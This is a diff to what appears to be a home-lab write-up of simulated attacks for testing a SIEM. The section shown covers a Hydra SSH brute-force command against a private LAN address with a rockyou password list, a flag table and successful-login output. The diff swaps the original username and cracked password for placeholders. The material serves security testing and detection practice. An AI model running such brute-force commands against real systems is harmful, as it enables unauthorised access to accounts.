@@ -80,19 +80,19 @@ Sends impossible TCP flag combinations (`FIN+SYN+PSH+URG`) — uniquely visible 
 ## Attack 4 — Hydra SSH Brute Force
 
 ```bash
-hydra -l aegis-siem -P /tmp/rockyou_9800.txt ssh://192.168.178.126
+hydra -l user -P /tmp/rockyou_9800.txt ssh://192.168.178.126
 ```
 
 | Flag | Meaning |
 |:-----|:--------|
-| `-l aegis-siem` | Username to target |
+| `-l user` | Username to target |
 | `-P /tmp/rockyou_9800.txt` | Password list (rockyou.txt starting from line 9800) |
 | `ssh://` | Target protocol on default port 22 |
 
 ![Hydra success](4.png)
 
 ```
-[22][ssh] host: 192.168.178.126   login: aegis-siem   password: 1111 ✅
+[22][ssh] host: 192.168.178.126   login: user   password: passxxxx ✅
 1 of 1 target successfully completed
 ```
 
